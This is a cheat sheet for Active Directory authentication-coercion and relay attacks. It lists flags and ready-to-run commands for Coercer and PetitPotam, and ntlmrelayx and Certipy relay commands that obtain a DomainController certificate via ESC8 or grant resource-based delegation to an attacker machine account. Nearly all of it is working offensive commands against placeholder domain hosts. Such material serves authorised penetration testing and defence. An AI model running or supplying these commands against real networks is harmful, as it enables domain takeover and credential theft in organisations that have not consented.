# Coercion Tooling Reference

## Coercer (https://github.com/p0dalirius/Coercer)

Install: `pipx install coercer` (or `sudo python3 -m pip install coercer`).
Modes: `scan`, `coerce`, `fuzz`.

| Flag | Meaning |
|------|---------|
| `-u, --username` | Domain username |
| `-p, --password` | Password |
| `-d, --domain` | Target domain |
| `--hashes LM:NT` | Pass-the-hash |
| `-k, --kerberos` | Kerberos auth |
| `-t, --target` | Single target host (IP/FQDN) |
| `-f, --targets-file` | File of targets |
| `-l, --listener` | Listener IP to receive coerced auth (coerce mode) |
| `-i, --interface` | Interface/IP to listen on (scan/fuzz modes) |
| `--target-ip` | Explicit target IP |
| `--always-continue` | Try all methods, don't stop on first success |
| `--filter-method-name NAME` | Only run a named method (e.g. PetitPotam) |
| `--filter-protocol-name NAME` | Filter by protocol (MS-EFSR, MS-RPRN...) |
| `--filter-pipe-name NAME` | Filter by named pipe (efsrpc, spoolss...) |

### Examples
```bash
coercer scan   -u u -p 'pw' -d corp.local -t 10.0.0.10 -l 10.0.0.50
coercer coerce -u u -p 'pw' -d corp.local -t 10.0.0.10 -l 10.0.0.50 --always-continue
coercer coerce -u u -p 'pw' -d corp.local -t 10.0.0.10 -l 10.0.0.50 --filter-method-name PetitPotam
coercer fuzz   -u u -p 'pw' -d corp.local -t 10.0.0.10 -l 10.0.0.50
```

## PetitPotam (https://github.com/topotam/PetitPotam)

Usage: `python3 PetitPotam.py [options] <listener> <target>`

| Flag | Meaning |
|------|---------|
| `-u USER` | Username (authenticated coercion) |
| `-p PASSWORD` | Password |
| `-d DOMAIN` | Domain |
| `-hashes LM:NT` | Pass-the-hash |
| `-pipe PIPE` | Named pipe (lsarpc, efsr, samr, netlogon, all) |

### Examples
```bash
python3 PetitPotam.py 10.0.0.50 10.0.0.10
python3 PetitPotam.py -u attacker -p 'pw' -d corp.local 10.0.0.50 10.0.0.10
```

## Relay targets

| Tool | Command |
|------|---------|
| Certipy (ESC8) | `certipy relay -target http://CA.CORP.LOCAL -template DomainController` |
| ntlmrelayx (ESC8) | `impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` |
| ntlmrelayx (RBCD) | `impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access --escalate-user 'attacker$' -smb2support` |

## 12 Coercion Methods (by protocol)
MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM (DFSCoerce),
MS-FSRVP (ShadowCoerce), MS-EVEN, plus additional RPC methods enumerated by `coercer scan`.
